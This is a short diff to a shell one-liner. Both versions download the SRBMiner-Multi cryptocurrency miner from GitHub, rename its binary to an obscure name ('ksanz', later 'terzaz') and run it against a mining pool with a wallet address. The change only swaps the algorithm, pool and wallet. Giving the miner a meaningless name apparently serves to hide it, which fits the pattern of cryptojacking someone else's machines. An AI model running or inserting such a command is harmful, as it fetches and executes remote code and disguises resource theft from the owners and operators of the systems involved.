@@ -1,1 +1,2 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI ksanz && ./ksanz --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 007DE31E4FD8213FBCE3586A3D2260C962142BBC605BB41C41.1 -t 4
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI terzaz && ./terzaz --disable-gpu --algorithm yescrypt --pool yescrypt.mine.zergpool.com:6233 --wallet DR3tfd7sud9wQ2HYRSdYzjsgdED6JqCyr1.1 --password c=DOGE -t 5
+
